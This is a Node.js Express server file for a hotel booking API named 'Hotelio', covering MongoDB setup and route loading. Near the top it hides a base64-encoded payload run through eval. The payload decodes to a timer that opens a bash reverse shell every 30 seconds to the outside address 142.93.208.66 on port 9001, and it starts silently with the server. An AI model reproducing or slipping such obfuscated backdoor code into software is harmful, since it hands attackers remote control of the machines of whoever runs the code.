require('dotenv').config();

const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

const Port = process.env.PORT || 1000;

const app = express();

mongoose.connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useFindAndModify: false,
    useCreateIndex: true,
    useUnifiedTopology: true
}).then(() => {
    console.log("Successfully connected to the database...");
}).catch(err => {
    console.log(`Could not connect to the database. ${err}`);
    console.log(`Exiting now...`);
    process.exit();
});
mongoose.Promise = global.Promise;

app.use(bodyParser.urlencoded({ extended: true}));
app.use(bodyParser.json());


app.get('/', (req, res) => {
    //console.log(req);
    res.json({"message": `Welcome to Hotelio application. ©2020`});
});

// Require all route
require('./src/routes/UserRoute')(app);
require('./src/routes/HotelRoute')(app);
require('./src/routes/RoomRoute')(app);
require('./src/routes/RentRoute')(app);

app.listen(Port, () => console.log(`Running in Port : ${Port}`));
